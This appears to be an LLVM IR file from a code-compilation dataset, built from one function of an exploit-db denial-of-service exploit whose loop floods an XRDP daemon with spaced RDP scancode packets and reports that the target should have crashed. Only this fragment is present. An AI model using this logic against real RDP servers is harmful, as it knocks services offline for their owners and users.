; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_8469.c_rdp_send_scancode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_8469.c_rdp_send_scancode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@RDP_KEYRELEASE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [56 x i8] c"\09Be patient!  It takes about a minute, the RDP packets\0A\00", align 1
@.str.1 = private unnamed_addr constant [61 x i8] c"\09need to be sent spaced apart or the daemon discards them.\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"[=] Progress: \00", align 1
@RDP_INPUT_SCANCODE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.4 = private unnamed_addr constant [56 x i8] c"\0A[=] The XRDP daemon on target host should be crashed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @rdp_send_scancode(i32 %0, i32 %1, i8 signext %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i32 %1, i32* %5, align 4
  store i8 %2, i8* %6, align 1
  %9 = load i8, i8* %6, align 1
  %10 = load i32, i32* %5, align 4
  %11 = load i32, i32* @RDP_KEYRELEASE, align 4
  %12 = and i32 %10, %11
  %13 = icmp ne i32 %12, 0
  %14 = xor i1 %13, true
  %15 = zext i1 %14 to i32
  %16 = call i32 @update_modifier_state(i8 signext %9, i32 %15)
  store i32 1, i32* %8, align 4
  store i8 30, i8* %6, align 1
  %17 = load i32, i32* @stderr, align 4
  %18 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* @stderr, align 4
  %20 = call i32 @fprintf(i32 %19, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.1, i64 0, i64 0))
  %21 = load i32, i32* @stderr, align 4
  %22 = call i32 @fprintf(i32 %21, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %7, align 4
  br label %23

23:                                               ; preds = %43, %3
  %24 = load i32, i32* %7, align 4
  %25 = icmp slt i32 %24, 100
  br i1 %25, label %26, label %46

26:                                               ; preds = %23
  store i32 1, i32* %8, align 4
  br label %27

27:                                               ; preds = %36, %26
  %28 = load i32, i32* %8, align 4
  %29 = icmp slt i32 %28, 5
  br i1 %29, label %30, label %39

30:                                               ; preds = %27
  %31 = load i32, i32* %4, align 4
  %32 = load i32, i32* @RDP_INPUT_SCANCODE, align 4
  %33 = load i32, i32* %5, align 4
  %34 = load i8, i8* %6, align 1
  %35 = call i32 @rdp_send_input(i32 %31, i32 %32, i32 %33, i8 signext %34, i32 0)
  br label %36

36:                                               ; preds = %30
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  br label %27

39:                                               ; preds = %27
  %40 = load i32, i32* @stderr, align 4
  %41 = call i32 @fprintf(i32 %40, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  %42 = call i32 @sleep(i32 1)
  br label %43

43:                                               ; preds = %39
  %44 = load i32, i32* %7, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %7, align 4
  br label %23

46:                                               ; preds = %23
  %47 = load i32, i32* @stderr, align 4
  %48 = call i32 @fprintf(i32 %47, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.4, i64 0, i64 0))
  %49 = call i32 (...) @rdp_disconnect()
  %50 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @update_modifier_state(i8 signext, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @rdp_send_input(i32, i32, i32, i8 signext, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @rdp_disconnect(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
